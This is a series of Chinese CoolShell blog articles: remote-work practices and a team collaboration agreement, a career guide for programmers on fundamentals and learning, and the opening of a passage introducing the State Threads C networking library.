#### 微观实践在远程工作中，我们需要有很多的微观操作来让大家能够更好的进行远程工作。因为远程工作也有一些问题（但是方法总比问题多，不是吗？）* **文档驱动** 。首先，远程的问题就是沟通不方便了，集中化的办公一群人可以在白板上进行讨论，然后远程工作这个事就变成很复杂了。所以，当要讨论什么事的时候，需要发起人先写一个文档，然后大家在这个文档上进行讨论（我们通常使用Github的issue，Pull Request或Google Doc）。另外，写文档的好处太多了，除了给后人有一个可以追溯的东西，更重要的是，写作是一种深度思考，当你把你脑子里想的东西写下来的时候，你就会发现你的思考更多了。所以，文档驱动我们团队能力非常重要的事。* **自动化和简化** 。自动化和简化是我平时追得最多的东西了，从软件的Unit Test, Functional Test, Performance Test 一直到用Kubernetes进行自动化部署，我要求的就是从一提交完代码后就自动化的上线。我们玩的是Amazon的“单分支”代码管理的玩法，一旦代码merge上master，就会直接上线（当然需要通过灰度）。因为远程团队如果没有自动化的工具，那么，就会导致整体效率的下降。
* **Owner文化** 。这个太重要的了，但是，这并不是在说，如果一个事没有owner，就会像“三个和尚”那样，事情就进了没人管的地步。这是因为很多人在工作中都是比较 nice 的，比较 nice 的人通常来说都不好意思跳出来对别人发号施令。所以，Owner 文化就是要求每件事都要定义一个Owner，而这个Owner是有权对其它人发号施令的，其他人也有义务要配合他。当然，Owner 的权利越大，责任也会越大！* **Review文化** 。Review文档是一种把知识或是想法传递出去的方式。我们在实践过程中，需要大家把好的想法写下来，这需要包括问题背景、目标、可选的方案（这些方案需要有引用和数据，不能是拍脑袋）、还需要有Pros/Cons的比较。然后再发起讨论。这样，事情在一开始就做好，那么就可以让大家的讨论更加地有效率。 **很多人以为开会讨论有个议题就行了，其实不够，有效率的开会讨论需要的是议案，而且还是高质量的议案！*** **目标承诺** 。我们需要每个人承诺自己的工作目标，这个完全由每个个体来发起、完成。一般来说，每个人自己给自己制定的计划最好是在1-2周内。* **自我管理** 。我们的实践是没有审批制度，无论是，休假、报销、出差，完全是自己自由安排，但需要告诉团队（除非在一些关键时期没法休长假，需要整个团队全力以赴），但千万不要撒谎和作弊，一旦发现，直接开除就好了。这个是基于好人更多的原则制定的（没有必要为了少数的坏人一刀切后让所有人痛苦）
* **闲聊和自行见面** 。见面和不能见面是一件非常不一样的事，在一起工作时，人和人是会有感情的，因为会有闲聊。远程的时候，则只有工作了。所以，我们鼓励团队人员间的私聊，闲聊，互相对方讲讲自己的经历和过往，同时，也鼓励员工自行出差到对方的城市见见跟你一起工作的人，公司报销差旅费。* **知识分享会** 。我们每周都有知识分享会，一次只讲半个小时，不贪多，就讲一个小的知识点。然后，团队中的一些人还主动使用Google Form来收集分享的反馈信息。* **就地奖励文化** 。我们默认上是没有年终奖，只有就地奖励文化。也就是说，你做的事挣钱了，利润中有70%公司拿走，剩下的30%团队的人就地分掉。这样会让团队里的每个人都会想怎么挣钱，除了可以把精力放到那些能够让用户付费的地方上，更重要的是让团队成员了解一下业务和用户为什么要付费，这个是非常关键的。当然，如果公司没有挣钱，但是员工工作的不错，我们还是会给年终奖的。不挣钱的主要责任是我的，而挣钱的主要功劳是团队的。* **外包支持性的工作** 。一些支持性的工作尽可能地使用外包，比如：HR、行政、发工资财务、员工持股、测试人员、定制化开发……这样可以让你的团队更小，更高内聚。更利于远程。
* **异步编程** 。如果一个项目是从零开始的，对于一个团队来说可能会是无从下手的，这需要有个人（owner）把代码的框架和结构给组织好。然后其他的人进入把坑填了，这样的效率会高很多。另外，不见面的结对编程，完全可以使用异步的方式进行，这其实就是多人干同一个pull request的方式。有Github这样的协议工作，远程编码变得很方便。关于我们的远程工具，我们主要是使用：* **开发环境**     * **AWS** ，我们主要使用AWS，因为我希望团队在使用AWS的时候能够被潜移默化。   * **协作工具**     * **Github** 。我们所有跟软件开发的工作都会在Github上，我们重度使用 Github 的 pull request 和 issue，也会使用 Github Project 里的看板和 Wiki。     * **Google全家桶** 。我们重度使用 Google，Google Group、Google Driver、Google Docs 主要是一些各式各样的文档。   * **通讯工具**     * **语音沟通** 。主要是使用Zoom，因为Zoom不但可以支持几十人在线，还可以云录制。如果小范围交流的话，一般使用微信语音。     * **工作沟通** 。主要是使用Slack，Slack作为一个信息集散地，可以分频道，可以分thread讨论，微信注是个渣。     * **吹水群** 。我司的吹水群主要是Telegram，因为比微信好太多了……
你会发现，我们的工具有好些都是在墙外的，是的，因为墙内的同类的工作实在是太难用了，没办法不用。而且， **我倾向于让大家用上最先进的工具，这样我们团队中的每个人的品味才会被这些好的工具潜移默化** 。#### 远程工作协议下面是我们的远程工作协议（无删减），这是每一个远程工作人员需要同意并做到的协议（其中有 Amazon Leadership Principles 的影子），目前在 v1.3 版，未来还会更新，我现在把它晒出来，也希望得到更好的建议！# MegaEase 远程工作团队协作协议 v1.3作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn# MegaEase 远程工作团队协作协议 v1.3## Principles### 0）Ownership & Leadership每个人都是Owner，都是Leader， 如果看到团队或是项目有问题的时候，不要等，也不忍，请马上说出来，并给出相应的方案， **自己跳出来召集开会，及时调整。不要闷在那里，自己憋！**### 1）Initiative每人个都必需是主动的，都需要自己发起要做的事，或是自己要认领要做的事，如果发现自己没有事情了， **需要学会主动发现问题，主动找到可以improve的地方，创新来源于此** 。没有路要学会自己造路！
### 2）Objectives Oriented每个人都是产品经理，也都是项目经理，每个人都必需把自己的工作和我们大的目标连接在一起，知道什么是重点，重点的东西就是两件事：一）从用户的角度出发，二）从产品的角度出发。 **这意味着我们要随时观察整个产品的样子，而不只是自己这一块东西** 。### 3）Insists on High Standard举法其上，得乎其中，举法其中，得乎其下，举法其下，法不得也。我们要坚持用高的标准要求自己，对于高标准的目标不妥协，但是在实施路径和策略上可以妥协。## Practices### 0）Online工作的时候必需在线。如果不在线了，需要说一下不在线的时长, 目前我们工作的事宜在通讯工具采用Slack， 如果需要请假的情况，如果不是紧急情况，需要 **提前一天** 在MegaEase的Slack _#random_ 频道中提前说明。如果是紧急情况，也需要提前在 _random_ 频道中告知大家。### 1) Documentation Driven面对面交谈、电话语音、微信、Slack虽然是比较实时的反馈工具，但是只有文档是可以把重要信息给结构化的，而且写文档其实是比起前面的方式来说是更为深度的思考，因为会让你自己审视自己的想法。所以，对于一些重要 “ **功能** ”、“ **流程** ”、“ **业务逻辑** ” 、“ **设计** ”、“ **问题** ”，以及“ **想法** ”，最好都以文档化的方式进行。请使用Github的 wiki、project、issue这些工具或是使用Google Doc.
### 2）Design Review对于一些重要的问题或是工作（每个人都能够判断什么是关键问题和工作）， **需要先把自己的想法share出来，而不是先实现** 。一个好的 Design 文档需要包括如下项：* **Background** 。交待这个事的背景、需求和要解决问题。   * **Objectives** 。说明这个事的目标和意义。   * **Alternative Solutions** 。 给出多个解决方案，并能够进行 Pros/Cons 对比。      * **Reference** 。方案需要有权威引用支持。     * **Data** 。方案需要有相关数据数据支持。   * **Conclusion** 。结论是什么。### 3) Simplification & Automation简化和自动化是软件工程所追求的两大目标，简化不是简陋，简化是对事物一种抽象和归纳能力，其能够提升软件的复用能力和扩展性，自动化是工程能力的重要体现，一方面，远程工作中自动化的能力可以让整个团队更高效地协作，另一方面，自动化是规模化的提条件。所以，我们要无时无刻地思考如何简化和自动化现有的事情。
### 4）Review & Re-factory无论是代码还是工作都是需要反思和重构的。反思是进步的源泉，项目告一段落时，出现问题时，都应该召集团队做集体反思，把好的东西坚持下去，把不好的东西优化掉。这样才能进步和改进。但是任何的优化措施是可执行的。### 5）Milestone Commitment对于一个项目，每个人都需要有自己的 milestone 计划， **这个计划最好是在2周以内，1周内是最好的。而且要承诺到** 。### 6）Evidence Driven任何讨论和分析都要基于权威的证据、数据或是引用。在我们做设计的时候，或是有争论的时候，说服对方最好的方式就是拿出证据、数据或是权威引用。比如：我的XX设计参考了TCP协议中的XX设计，我的XX观点是基于XX开源软件的实现……如果争论不休就停止争论，然后各自收集和调查自己观点的佐证。### 7）Demo Day把自己做的东西跟团队做一次实时的演示。这样有助于开发人员从产品角度思考自己的工作。除了演示产品功能，还可以演示算法，设计，甚至代码。### 8) Effective Meeting会议主要处理三件事：提出议案、发现问题、共识结论。
* 会议不仅仅要有议题，最好还有议案。   * 会议期间不解决问题，只发现问题，和跟踪问题。   * 会议必需要有共识和结论，如果不能达到共识和结论，那就当成问题处理，由问题的负责人跟进问题。关于周会或是临时性的团队会议（私下讨论不属于会议），会议组织者需要在事前收集会议议题，其中包括如下分类：* **项目类** ：需要事先有项目进度计划表（任何分项最好控制在1-2人周内）   * **方案类** ：需要事先写好相关的方案和设计才能讨论（参看 Design Review 章节）   * **问题类** ：需要事先写好相关的问题和解决提案（参看 Design Review 章节）   * **决策类** ：需要事先写好整事的前因后果以及利弊分析   * **信息类** ：需要事先写好相关的事宜说明组织者需要在周五的时候发出会议议题收集，其中包括：* 自己知道的项目的进度跟进（需要相相关的项目负责人准备相关的项目计划）   * 方案和问题类的需要各个项目负责人提出来，并有相关的设计文档可供Review   * 信息类和决策类的事宜可以写在Google Doc上，也可以写在 Team 的 Issue 里
其它负责人可以在会议上加入自己团队的东西，或是要求其他团队提供更多的信息。### 9）1-2-3 Escalation遇到问题的时候，自己一个人处理1小时内没有思路，请找他人小范围讨论，如果与他人2小时内没有结果，请上升到团队范围，如果在团队范围3小时内没有思路，我们就需要借助外部力量了。### A）3PS Update每个人更新进度的时候，不要只是一个check-in，而是需要更 meaningful 的说一下工作内容，在工作告一段落的时候，希望简单的说一下工作总结。这里的practice是： **3PS – Plan，Proirity，Problem，Summary， – 你的计划是什么？优先级是什么？遇到了什么问题？当前的工作摘要** 。### B) Disagree and Commitment在我们开发的时候，团队的成员都会有自己风格，必然会对同一个问题产生较大的争议（Disagree），我们鼓励有争议，但是是在团队的决议作出之前。一旦团队形成决议，团队的成员就必须支持这个决议，并在这个方向上做出贡献。但是关于决议的形成过程肯定充斥着各种的争论，对于这些争论，我们可以按照下面的Guidline 来处理争议：
* Owner要负责对重大的讨论推进，尽快形成结论。   * 在决议过程中，要有纪要，要更新到 Github 相关项目的 Issue 或 Pull Request 里，并且要让整个团队知道，信息平等很重要。   * 不要妥协，坚持高的标准。第一标准是工业标准，第二标准是国外的大公司标准（如：google, fb, github, aws…），第三标准才是国内的标准。   * 那怕再复杂，只要是标准，就可以说服用户。用户再无理，也不可能反对工业级的标准。   * Release出去的东西，只要被用户用上了，要改就难了，所以要谨慎而果敢。#### 小结远程工作并不是目的，但是远程工作会逼迫管理者面对管理的本质问题。远程工作趋向于找到优秀自驱的人才，守护团队的共同目标，并打造精悍高能的团队，并要求我们在需要沟通和协作的地方使用更为科学和有效的手段，在各个环节中提升工作效率，降低组织内耗……你的团队管理模型是否最优，在远程工作下就会一览无余！远程工作只是一个手段，提升管理水平才是真正的目的！（全文完）# 程序员如何把控自己的职业作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
这篇文章的主要内容主要是我今年3月份在腾讯做的直播，主要是想让一些技术人员对世界有一个大体的认识，并且在这个认识下能够有一个好的方法成就自己。而不是在一脸蒙圈的状态下随波逐流，而日益迷茫和焦虑。直播完后，腾讯方面把我的直播形成文字的形式发了出来，我觉得我可以再做一个精编版。所以，有了这篇文章，希望对大家有帮助。对我来说，在我二十多年的工作经历来看，期间经历了很多技术的更新换代，整个技术模式、业务模式也是一直变来变去，我们这群老程序员成长中所经历的技术比今天的程序员玩的还更杂更多。我罗列一下我学过的，而且还被淘汰掉的技术，大家先感受一下。- MIS应用开发：FoxPro，PowerBuilder，Delphi     - OA：Lotus Notes，VBScripts     - 微软：ODBC/ADO，COM/DCOM，MFC/ATL，J++     - 服务器：AIX，HP-UX，SCO Unix     - Web：CGI，ISAPI，SOAP     - RPC：CICS，Tuxedo     - J2EE：Websphere，Weblogic     - DB：Sybase，Informix
我想说的是，无论过去还是今天，我们这些前浪和你们后浪所面对的技术的挑战和对技术的焦虑感是相似的，我们那个时候不但玩996，还玩封闭开发（就是一周只能回家一天）。当然，唯一好的东西，就是比起今天的程序员来说，我们那个年代没有像微信、微博、知乎，抖音这些巨大消耗你人生的东西，所以，我们的工作、生活和成长都有很效率，不会被打断、喜欢看书、Google还没有被封……当然，那时代没有StackOverlow和Github这样的东西，所以，能完成的东西或质量都一般。当然，这里并不是想做一个比较，只是想让大家了解一下两代程序员间的一些问题各有千秋，大同小异。在整个成长过程中，其实有很多东西是相通的，其本上来说，就是下面的三件事——**第一** ，如果想要把控技术，应对这个世界的一些变化， **需要大致知道这个世界的一些规律和发展趋势，另外还得认识自己** ，自己到底适合做什么？在这个趋势和规律下属于自己的发挥领域到底是什么？这是我们每个人都需要了解的。**第二** ， **打牢基础，以不变应万变** ，不管世界怎样变化，我都能很快适应它。基础的重要程度对于你能够飞多高是相当有影响的，懂原理的人比不懂原理的人能做出来的事情或是能解决的问题完全是两个层级的。
**第三，提升成长的效率** ，因为现在社会的节奏实在太快了，比二十年前快得太多，技术层出不穷，所以我们的成长也要更有效率。效率并不单指的快，效率是怎么样更有效，是有用功除以总功（参看《加班与效率》），怎么学到更有效的东西，或者怎么更有效学习，是我们需要掌握的另一关键。下面是我这多年来的一些认识，希望对你有帮助。目录* 世界发展趋势   * 人才需求   * Google评分卡   * 认识自己   * 打好基础   * 学习效率   * 小结#### 世界发展趋势**我个人经历的信息化革命应该分成三个阶段：*** **1990年代到2000年，这个时代MB时代** ，是雅虎、新浪、搜狐、网易门户网站的时代，这个时代就是ISP/ICP互联网提供商，把一些资讯数字化，然后发布到网络上。   * **2000年到2010年，这个时代叫GB时代，或是叫多媒体或UGC时代** ，上网开始变得普遍了，每个人手里的数码设备开始变得多了起来，可以上传照片，可以上传视频，甚至可以在网上做社交。   * **2010年到2020年，这个时代叫TB时代，这过去的十年是移动互联网时代** ，移动互联网只需要手机在线，不需要依靠电脑。因为手机随时在线，所以个人的各种各样的数据始终在被收集，只要用户上网就会产生数据，所以人的行为最终也被数字化了。
所有的硬件和软件都是跟着需要处理的数据而演进的，我们需要更大的带宽，更大的硬盘，更多的处理器……大到一定时候就只能进入分布式化的技术架构了，再大，数据中心也顶不住了，就会要引入更为分布式的边缘计算了。另一方面，从业务上来看， **我们可以看到整个世界就在不断地进行数字化，因为，只要数字化了，就可以进行复制传播和计算，只要可以进行计算了，就可以进行数学建模，就可以自动化，只要可以自动化了就可以规模化，只要可能规模化了，就可以改变整个行业** 。人类的近代史的大趋势基本上都是在解决能源和自动化的事，源源不断的能源是让机器不知疲倦的前提条件，用机器代替牲口，代替人类进行工作是规模化的前提条件。所以， **技术的演进规律基本是自动化加规模化，从而降低成本，提升效率** 。这就是为什么世界变得越来越快，人类都快跟不上节奏的原因，主要是整个社会不断被机器、数据所驱动。#### 人才需求在这个过程中，需要什么样的人？下面是我的一些认识——* **技工** ，在机器和自动化面前，肯定是需要能够操作机器的技术工人了，这类人是有技术的劳动力。在编程的圈子里俗称“码农”，他们并不是真正的工程师，他们只是电脑程序的操作员，所以， **随着技术门槛的下降或是技术形式的变更他可能就会变得越来越不值钱，直到被淘汰掉** 。   * **特种工** ，这种人是必须了解原理和解决难题的一类人，他们是解决比较难的、特定的一些技术问题。 **当一种技术被淘汰，他并不容易被淘汰，因为他懂原理，原理就是解决问题的能力，是解决问题的套路和方法** 。   * **工程师** ，不但是使用技术，还可以把活儿做好，他们认为代码更多的时间是在维护，这些人使用各种各样的手段和各种技术，精益求精地持续不断地提高代码的易读性、扩展性、可维护性和重用性，这个过程似乎永无止境。对于这些有“洁癖”，有“工匠精神”，有“修养”的技术人员，我们称他们为工程师。 **这种人做事又稳又快，而且可以做出很多称手的工具和方法论** 。   * 再往上是 **设计师和架构人员** ，这些人主要是开发一些工具，框架，模式，提升软件开发和维护效率，同时也提升用户体验，和提升稳定性、性能、代码重用等，总的来说就是为了降本增效。这类人的工作降低了技术得到门槛，他们把技术门槛降低了以后，就可以把这个技术普及开来，就可以由广大劳工、技工、特殊工人使用了。   * 还有一类人是 **经理** ，经理主要是组织团队、完成项目、创造利润。这类人中，即有身先士卒的leader，也有高高在上的boss，但无论怎么样，这些人只不过是为了让一个公司或是一个团队更好组织在一起的“粘合剂”，这类人只有在大公司中才会变成更有价值。
这就是我总结的世界需要哪些人才，我们了解这些东西以后大概就明白我们现在所处的位置有什么样的问题，我们应该去什么样的地方。#### Google评分卡接下来，我们再来看看Google的SRE的自我评分卡：> 0 – 对于相关的技术领域还不熟悉   >  1 – 可以读懂这个领域的基础知识   >  2 – 可以实现一些小的改动，清楚基本的原理，并能够在简单的指导下自己找到更多的细节。 > > 3 – 基本精通这个技术领域，完全不需要别人的帮助   >  4 – 对这个技术领域非常的熟悉和舒适，可以应对和完成所有的日常工作。 > >   * 对于软件领域 – 有能力开发中等规模的程序，能够熟练和掌握并使用所有的语言特性，而不是需要翻书，并且能够找到所有的冷知识。 >   * 对于系统领域 – 掌握网络和系统管理的很多基础知识，并能够掌握一些内核知识以运维一个小型的网络系统，包括恢复、调试和能解决一些不常见的故障。 >> > 5 – 对于该技术领域有非常底层的了解和深入的技能。 > > 6 – 能够从零开发大规模的程序和系统，掌握底层和内在原理，能够设计和部署大规模的分布式系统架构   >  7 – 理解并能利用高级技术，以及相关的内在原理，并可以从根本上自动化大量的系统管理和运维工作。   >  8 – > 对于一些边角和晦涩的技术、协议和系统工作原理有很深入的理解和经验。能够设计，部署并负责非常关键以及规模很大的基础设施，并能够构建相应的自动化设施 > > 9 – 能够在该技术领域出一本经典的书。并和标准委员会的人一起工作制定相关的技术标准和方法。   >  10 – 在该领域写过一本书，被业内尊为专家，并是该技术的发明人。
SRE需要自评如下这些技术或技能。> – TCP/IP Networking (OSI stack, DNS etc)   >  – Unix/Linux internals   >  – Unix/Linux Systems administration   >  – Algorithms and Data Structures   >  – C/C++   >  – Python   >  – Java   >  – Perl   >  – Go   >  – Shell Scripting (sh, Bash, ksh, csh)   >  – SQL and/or Database Admin   >  – Scripting language of your choice (not already mentioned) _____________   >  – People Management   >  – Project Management这个评分卡是面试Google前需要候选人对自己的各种技术进行自评，也算是一种技术人员的等级的度量尺，其把技术的能分成11个等级，我用颜色把其它成四大层级，希望这个评份卡能够给你一个能力提升的参考标准。
#### 认识自己认识了世界是怎么发展的，也知道技术人员的种类和层级，那么还要了解一下自己，因为如果不了解自己，那么你也无法找到自己的路和适合自己的地方。我觉得，一个人要认识自己就需要认识自己的特长、兴趣、热情、擅长等，下面是一个认识自己的标准方法：* **特长** 。首先你要找得到自己特长。你要认识自己的特长，找到自己的天赋，找到你在DNA里比别人强的东西，就拿你的DNA跟别人竞争就好了。所以你要找到自己可以干成的事，找到别人找你请教的事，你身边人找你请教就是说明你有特长。这是找到自己特长非常非常重要，扬长避短。   * **兴趣** 。如果你没有找到自己特长，就找自己有兴趣有热情的东西。什么叫兴趣？兴趣是再难再累都不会放弃的事。如果你遇到困难就会放弃不叫兴趣，那叫叶公好龙。不怕困难，痴迷其中，就算你没有特长，有了这种特质，你也是头部的人才。   * **方法** 。如果你没有特长，没有兴趣和热情就要学方法。这种方法就是要有时间观念，要会做计划，要懂统筹、规划对于做过的事情，犯过的错误多总结，举一反三，喜欢自己找答案，自己探究因果关系，这是一些方法，自己总结一些套路。   * **勤奋。** 如果你没有特长，没有兴趣，也没有方法，你还能做的事就是勤奋，勤奋注定会让你成为一个比较劳累的人，也是很有可能被淘汰的人随着你的年纪越来越大，你的勤奋也会越来越不值钱。因为年轻人会比你更勤奋，比你更勤奋、比你斗志更强，比你能力更强，比你要钱更少的人会出现。勤奋最不值钱，但是只要你勤奋至少能够自食其力。
以上就是为了应对未来技术变化，作为个人必须要从特长、兴趣、方法一层一层筛选挖掘， **如果没有这些你就要努力和勤奋。就只能接受“福报”了** 。从我个人而言，我不算是特别聪明的人，但自认为对技术还是比较感兴趣的，难的我不怕。有很多比较难啃的技术，聪明点的人啃一个月就懂了，我不行，我可能啃半年。但是没有关系，知识都是死的，只要不怕困难总有一天会懂的。最可怕是畏难，为自己找借口，这样就不太好了。#### 打好基础最前面提到我学的各式各样的被淘汰的技术，会让你感觉很迷茫，或是迷失。但前面也提到了“谷歌评分卡”，在这个评分卡中，我们看到了许多基础原理方面的内容，其实要应对未来的变化，很重要的一点就是无招胜有招，以不变应万变。**变化都是表面的东西，内在的东西其实并没有太多的变化** 。理论层面上变得不多，反而形式上的东西今天一个花样，明天一个花样，所以如果要去应对这种变化，就一定要打牢自己的基础，提升内功修养。比如像编程的一些方式和套路，修饰模式原理本质，解耦，提升代码的重用度等。提升代码重用度必须解耦，要跟现实解耦，提升抽象，这些都是一些技术基础。无论用什么语言，都是这么做的。打牢基础就可以突破瓶颈，不打牢基础没有办法突破瓶颈。 **在技术世界不要觉得量变会造成质变，这是不可能的** 。技术这个东西就像搞建筑砌砖头，砌砖头砌的再多也不可能让你能成为一个架构师的，因为你 **不懂原理，不懂科学方法，你就不可能成长上去的** ，就像学数学一样，当你掌握了微积分这种大杀器后，你解题的能力是无所披靡，而微积分这种方式绝对不是你能“量变”出来的。
所以你必须学习基础的理论知识，如果不学这些基础理论知识，还要学习解题思路和方法，如果你只学在表面，那么当这个技术的形式有变化，就会发现以前学的都没用了，要重头学一遍。 **掌握技术基础可以让自己找到答案和知识，基础是抽象和归纳，很容易形成进一步的推论** 。我们学的很多技术实现都逃不脱基础原理，不管是Java，还是其他语言，只要用TCP用的都是相同的原理，逃不出范围， **只要抓住原理，举一反三，时间一长了，甚至还可以自己推导答案** 。对于技术的基础，我会把其它成四类：* **程序语言** ：语言的原理，类库的实现，编程技术（并发、异步等），编程范式，设计模式……   * **系统原理** ：计算机系统，操作系统，网络协议，数据库原理……   * **中间件** ：消息队列，缓存系统，网关代理，调度系统 ……   * **理论知识** ：算法和数据结构，数据库范式，网络七层模型，分布式系统……**这些知识其实就是一个计算机科学专业的学生他所要学习的原理** ，但可惜的是，我们的一些学校教得也很糟糕，不但老师能力不足，而且放着世界上最优秀的教课书不用了，一定要自己写一本。讲也讲不全，还有各种错误，哎……总之，如果你学习用用到的教材不行，那么可以肯定的是你的学习效率一定是很糟糕的。这就是为什么我们大学上完了，还是跟个傻瓜一样，还要在工作中再重新自学。
不过，就算自学，这些基础技术大概需要四五年的时间堆叠。 **我工作二十年了，这二十年来基本还是这些原理没变，无论形式怎么变，但是核心永远还是这些，理论创新很难，这是以不变应万变** 。#### 学习效率谈到学习效率，就需要拿出这张学习金字塔的图来了。从图可以看到学习方法分布两层，一种是被动学习，也是浅度学习，听讲，阅读，视听，演示都是在被动学习，而与人讨论，自己动手实践，教授给别人是主动学习。主动学习我们称之为深度学习，如果你不能深度学习，你就不能真正学到东西。这也是你会经常有“学那么多干什么，不用就忘了”，这就是浅度学习的症状了。下面，我给出一些我自己觉得不错的学习经验：**1、挑选一手知识和信息源。** 对于学习方法：第一我们一定要到知识源去挑选知识，知识信息源非常关键，二手信息丢失太大了，谭浩强写的书就丢失太多信息了。 **目前计算机一手知识基本都是国外的** ，所以 **英文非常重要** 。我鼓励大家一定读第一手的资料。如果你英语有问题，至少要看翻译过来，最好是原汁原味翻译的，不要我理解了给你讲那种，那种也是被别人嚼一遍再讲给你你没有体会，是别人带着你，别人的体会会影响你，也许你的体会会比他更好，因为是你自己总结出来的东西，所以知识源很重要。
**2、注意原理和基础** **第二要注重基础原理** 。虽然可以忘记这个技术，但是原理记在心里，我可以徒手实现出来，而且通过原理可以更快学习其他类似的技术。所以原理很重要！当你学会C、C++要学Java和GO都很快。**3、使用知识图谱** **一定要学会使用知识图** ，把知识结构化。从一个技术关键点开始不断地关联和细化下去，比如：关于TCP协议，首先第一个要记住状态图，怎么建立连接，怎么断连接，状态怎么变迁。TCP没有连接，是靠状态维护连接的。其次，要了解TCP怎么保证可靠性，就是丢包以后怎么重传，重传有哪些技术点。然后，重传会让你联想到拥塞控制，拥塞控制到滑动窗口……。这基本就是TCP的所有东西了，找到关键点，然后顺着这个脉络一点点往下想，通过知识图关联就可以进行顺藤摸瓜。我们不需要记所有知识，那些 **手册的知识不需要记，你知道在哪里能找到就可以了** 。你脑子里面要有地图，学一个东西就跟在城市生活一样，闭上眼睛就知道地图，A点到B点怎么去大概方向要知道。我在北京我去广州，广州在南边，我大概坐飞机还是火车要心里有数。。**4、学会举一反三** 。就是用不同方法学一个东西，比如说学TCP协议，看书是一种方法，编程是另外一种方法，还有用做Debug去看的，用不同方法学一个东西会让你更加熟悉，你学一个知识的同时把周边也学了。比如说学前端能不能把HTTP学一下，比如说长连接、短连接，包括hp1、hp2有一些不一样的东西。
**5、总结和归纳。** 只有学会总结和归纳，才能形成自己的思维框架、自己的套路、自己的方法论，以后学这个东西应该怎么学。就像学一门新的语言，不管GO语言，还是Rust语言，第一件事情就是了解内存是怎么管理的，数据类型什么样，第二是泛型怎么搞，第三是并发怎么弄。还有一些抽象怎么弄，比如说怎么解耦，怎么实现多态？套路这种东西只有学的多了以后才能形成套路，如果你只学会一门语言不会有套路，你要每年学门语言，不用学多精，你思考这个语言有什么不一样，为什么这个这种有玩法，那个有那种玩法，这些东西思考多了套路方法论就出来了。比如说Windows和Linux有什么不同，Linux和Unix又有什么不同？只有总结自己的框架、套路和方法，这些才永远不会被淘汰。**6、实践和坚持。** 剩下就是多做多练，多坚持，只有实践才会有经验，只有锻炼了才能够把自己的脂肪变没，所以， **要把知识变成技能必须练** ，就像小学生学会加减乘除，还是要演练，必须多做题，题目做得多了，自然掌握得好。要挑选好的知识源，注重原理技术，有一些原理的基础的书太枯燥，但是我告诉你学习这些基础太值得投入时间，搬砖赚几十元不值得，因为赚的是辛苦钱，老了就赚不了，必须要赚更有能力的钱，这是学习投资。
#### 小结好了，该到这篇文章收尾的时候了，小结一下，如果你想更好的把握时代，提升自己，你需要知道这个时代的趋势是什么，需要什么样的人，这些人需要什么样的能力，这些能力是怎么获得的，投入到基础知识的学习就像“基建”一样，如果基础不好，不能长高，学习能力也是需要适应这个快速时代的重要的基础能力，没有好的学习能力，很快就会掉队被淘汰。这些东西，是我从业二十年来的总结和体会，希望对你有用。（全文完）# State Threads 回调终结者作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**（感谢网友** **@我的上铺叫路遥** **投稿）**上回写了篇《一个“蝇量级”C语言协程库》，推荐了一下Protothreads，通过coroutine模拟了用户级别的multi- threading模型，虽然本身足够“轻”，杜绝了系统开销，但这个库本身应用场合主要是内存限制的嵌入式领域，提供原生态组件太少，使用限制太多，比如依赖其它调用产生阻塞等。这回又替大家在开源界淘了个宝，推荐一个轻量级网络应用框架 **State Threads** （以下简称ST），总共也就3000行C代码，跟Protothreads不同在于ST针对的就是 **高性能可扩展服务器** 领域（值得一提的是Protothreads官网参考链接上第一条就是ST的官网）。在其FAQ页面上一句引用”Perfection is achieved not when there is nothing more to add, but rather when there is nothing more to take away.”可以视为开发人员对ST源码质量的自信。
目录* 历史渊源   * 基于事件驱动状态机（EDSM）   * 基于Mult-Threading范式   * 基于多核环境   * 使用限制   * 总结   * 参考#### 历史渊源首先介绍一下这个库的历史渊源，从代码贡献者来看，ST不是个人作品，而是有着雄厚的商业支持和应用背景，比如服务器领域，在这里你可以看到ST曾作为Apache的多核应用模块发布。其诞生最初是由网景（Netscape）公司的MSPR（Netscape Portable Runtime library）项目中剥离出来，后由SGI（Silicon Graphic Inc）还有Yahoo!公司（前者是主力）开发维护的独立线程库。历史版本方面，作为SourceForge上开源项目，由2001年发布v1.0以来一直到2009年v1.9稳定版后未再变动。在平台移植方面，从Makefile的配置选项中可知ST支持多种Unix- like平台，还有专门针对Win32的源码改写。源码例子中，提供了web server、proxy以及dns三种编程实例供参考。可以说代码质量应该是相当的稳定和可靠的。至于许可证方面，有必要略作说明。出于历史原因，网景最初发布时选择了MPL1.1许可证，而后SGI在维护中又混进了GPLv2许可证，照理说这两种许可证是互不兼容的（MPL1.1后续版本是GPL兼容的），也就是说用双许可证打包发布理论上是非法无效的，见GNU官网上MPL兼容性一节。但这里有值得商榷的地方，因为文中又提及，根据MPL1.1中某条款第13节，如果整段或部分代码允许采用另一许可证作为备用（alternate）选择，比如GPL及其兼容，那么整个库的许可证就可视为GPL兼容的。如此一来所谓GPL兼容性一般解释为你不能在GPLv2的代码中混入MPL1.1，而不是说你不能在MPL1.1代码中混入GPLv2，也就是说GPLv2在MPL1.1之后是可以接受的，事实上SGI就采用了后面的做法，尚未引起版权上的纠纷。为此我还考证了一下FAQ上license一节的说法，说ST既可以在MPL和GPL之间选择一种，也可以继续用双许可证，还补了一句在non- free项目使用上也没有限制，但对ST源码所做改动必须对用户可见。在源码文件中的SGI的附加声明还解释了将ST转为GPL代码的做法，就是可以删除前面MPL的声明，否则后续用户仍可以在两者之间二选一。个人觉得既然SGI都这样发话了，那么可解释为反之删除GPL的声明继续采用MPL也是可以接受的，如果你对双许可证承诺仍不放心的话。
#### 基于事件驱动状态机（EDSM）好了，下面该进入技术性话题了。前面说了ST的目标是 **高性能可扩展** ，其技术特征一言以蔽之就是> **“It combines the simplicity of the multi-threaded programming paradigm, in > which one thread supports each simultaneous connection, with the performance > and scalability of an event-driven state machine (EDSM) architecture.”**我们先来纵向比较ST与传统的EDSM区别，再来横向比较与其它线程库（比如Pthread）的区别（注：以下图片全部来自State Threads Library FAQ）。传统EDSM最常见的方式就是I/O事件的 **异步回调** 。基本上都会有一个叫做dispatcher的单线程主循环（又叫event loop），用户通过向dispatcher注册回调函数（又叫event handler）来实现异步通知，从而不必在原地空耗资源干等，在dispatcher主循环中通过select()/poll()系统调用来等待各种I/O事件的发生，当内核检测到事件触发并且数据可达或可用时，select()/poll()会返回从而使dispatcher调用相应的回调函数来对处理用户的请求。所以异步回调与其说是通知，不如说用委托更恰当。
